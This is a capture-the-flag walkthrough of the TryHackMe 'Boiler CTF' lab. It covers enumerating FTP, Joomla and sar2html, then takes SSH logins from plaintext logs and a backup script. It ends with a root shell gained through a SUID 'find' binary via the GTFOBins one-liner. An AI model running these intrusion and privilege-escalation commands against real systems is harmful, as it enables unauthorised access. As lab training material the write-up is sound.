---

Name: Boiler CTF
Difficulty: Medium
URL: https://tryhackme.com/room/boilerctf2
Description: Intermediate level CTF. Just enumerate, you'll get there.

---

## Enumeration

I started with a full port scan:

```bash
rustscan -a 10.114.156.220 -r 1-65535 --ulimit 5000 -- -sC -sV
```

```text
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 (Ubuntu)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

A few things immediately stood out:

* FTP allows anonymous login.
* HTTP is running on port 80.
* Webmin is running on port 10000.
* SSH is running on the unusual port `55007`.

---

## FTP Enumeration

Anonymous FTP access was enabled:

```bash
ftp 10.114.156.220
```

```text
Name: anonymous
230 Login successful.
```

Listing the directory revealed a hidden file:

```text
-rw-r--r--    1 ftp ftp 74 Aug 21 2019 .info.txt
```

I downloaded it:

```bash
get .info.txt
```

The file contained:

```text
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

This is ROT13. Decoding it gives:

```text
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

The file extension is simply:

```text
.txt
```

---

## Port 10000 — Webmin

Port `10000` was running Webmin:

```text
MiniServ 1.930
```

The room asks whether the service can be exploited.

**Answer: nay**

Although older Webmin versions have known vulnerabilities, this particular version is not vulnerable to the unauthenticated RCE that is commonly associated with Webmin.

---

## Port 55007

The highest open port was:

```text
55007/tcp
```

SSH was running on this port.

**Answer: 55007**

---

## Web Enumeration

The web server on port 80 initially showed the default Apache page, so I ran Gobuster:

```bash
gobuster dir -u http://10.114.156.220 \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-t 100 -x txt,php,html,bak,zip,log,old,js -k
```

Among the results was:

```text
joomla (Status: 301)
```

So Joomla was accessible at:

```text
http://10.114.156.220/joomla/
```

**CMS:** Joomla

---

## robots.txt

The `robots.txt` file contained several interesting paths:

```text
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it
```

It also contained a sequence of numbers:

```text
079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

These are ASCII character codes and are another example of the room hiding information in plain sight.

---

## Joomla Enumeration

I enumerated the Joomla directory:

```bash
gobuster dir -u http://10.114.156.220/joomla/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-t 100 -x txt,php,html,bak,zip,log,old,js -k
```

Some interesting results were:

```text
README.txt
administrator
components
configuration.php
tests
_archive
_database
_files
_test
```

The `README.txt` confirmed that this was a Joomla installation:

```text
This is a Joomla! installation/upgrade package to version 3.x
```

---

## Hidden Files

The `_files` directory contained:

```text
VjJodmNITnBaU0JrWVdsemVRbz0K
```

After decoding it twice with Base64, it became:

```text
Whopsie daisy
```

The other directories contained similar messages:

```text
_archive
Mnope, nothin to see.
```

```text
_database
Lwuv oguukpi ctqwpf.
```

The `_database` message is encoded with ROT2/ROT-style shifting and decodes to:

```text
Just messing around.
```

Again, the main lesson was to keep enumerating.

---

## `_test`

The `_test` directory was especially interesting:

```text
http://10.114.156.220/joomla/_test/
```

It contained an application called **sar2html**.

The page described a tool for generating reports from SAR data.

I then enumerated the directory:

```bash
gobuster dir -u http://10.114.156.220/joomla/_test \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-t 100 -x txt,php,html,bak,zip,log,old,js -k
```

The interesting result was:

```text
log.txt (Status: 200)
```

---

## Finding SSH Credentials

Opening:

```text
http://10.114.156.220/joomla/_test/log.txt
```

revealed SSH logs containing credentials:

```text
Accepted password for basterd from 10.1.1.1 port 49824 ssh2
#pass: superduperp@$$
```

This gave us:

```text
Username: basterd
Password: superduperp@$$
```

Since SSH was running on port `55007`, I connected with:

```bash
ssh -p 55007 basterd@10.114.156.220
```

---

## Finding the Other User's Password

After logging in as `basterd`, I checked the home directory:

```bash
ls -l
```

There was a script called:

```text
backup.sh
```

Reading it revealed another password:

```bash
cat backup.sh
```

The interesting line was:

```text
#superduperp@$$no1knows
```

This was the password for the `stoner` user.

I switched users:

```bash
su stoner
```

Using:

```text
superduperp@$$no1knows
```

I successfully became `stoner`.

---

## First Flag

As `stoner`, I checked the home directory:

```bash
ls -a
```

There was a hidden file:

```text
.secret
```

Reading it revealed the first flag:

```bash
cat .secret
```

---

## Privilege Escalation

Next, I checked the available sudo permissions:

```bash
sudo -l
```

The result was:

```text
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

The specified file did not exist.

I then checked for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

The important result was:

```text
/usr/bin/find
```

`find` had the SUID bit set, meaning it could be abused to execute commands with elevated privileges.

Using the standard GTFOBins technique:

```bash
find . -exec /bin/sh -p \; -quit
```

I got a privileged shell.

Checking the current user:

```bash
whoami
```

```text
root
```

I was now root and could read the final flag:

```bash
cat /root/root.txt
```
